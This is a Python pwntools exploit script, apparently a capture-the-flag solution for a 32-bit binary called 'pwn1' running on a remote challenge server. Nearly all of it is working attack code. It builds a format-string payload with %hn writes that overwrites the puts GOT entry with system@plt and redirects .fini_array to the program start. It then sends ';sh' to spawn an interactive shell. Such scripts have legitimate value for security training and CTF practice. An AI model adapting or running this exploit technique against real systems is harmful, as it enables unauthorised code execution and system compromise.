#!/usr/bin/env python3
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn1"
libFile  = ""

remoteIp = "39.97.119.22"
remotePort = 44500

LOCAL = 0
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru('?')
	puts_got = exe.got['puts']

	system_plt = exe.plt['system']
	fini_array = 0x08049F0C

	start_addr = 0x08048450
#	system_plt = 0x08048410
	li('puts got: ' + hex(puts_got))
	li('system plt: ' + hex(system_plt))

	offset = 6
	prelen = len('hello: ')

	print(type(p32(0x1)))
	p = b'A'
	# high word
	p += p32(puts_got + 2)
	p += p32(fini_array + 2)
	# low word
	p += p32(puts_got)
	p += p32(fini_array)
	p += bytes(('%' + str(0x0804 - 0x11 - prelen) + 'c%' + str(offset) + '$hn'), encoding = 'utf8')
	p += bytes(('%' + str(offset + 1) + '$hn'), encoding = 'utf8')
	# modify lowword(strlen_got)
	p += bytes(('%' + str(0x8410 - 0x0804) + 'c%' + str(offset + 2) + '$hn'), encoding = 'utf8')
	p += bytes(('%' + str(0x8450 - 0x8410) + 'c%' + str(offset + 3) + '$hn'), encoding = 'utf8')

	#db()
	sl(p)
	ru('?')
	sl(';sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		io = exe.process()
		if LIBC:
			libc = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
